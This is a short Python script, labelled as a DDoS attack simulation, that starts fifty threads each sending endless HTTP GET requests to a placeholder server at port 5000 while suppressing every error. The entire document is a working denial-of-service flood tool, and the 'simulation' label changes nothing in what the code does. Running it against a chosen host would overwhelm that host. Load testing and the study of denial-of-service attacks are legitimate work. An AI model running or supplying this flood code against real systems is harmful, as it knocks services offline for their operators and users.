"""
Description: A simple DDoS attack simulation script
Author: github.com/h-i-e-u
Version: 1.0
"""
import requests
import threading

def attack():
    while True:
        try:
            requests.get("http://server:5000/")
        except:
            pass

for i in range(50):
    t = threading.Thread(target=attack)
    t.start()
    print("Start Attack Thread", i+1)
    print(f"Thread {i+1} started")
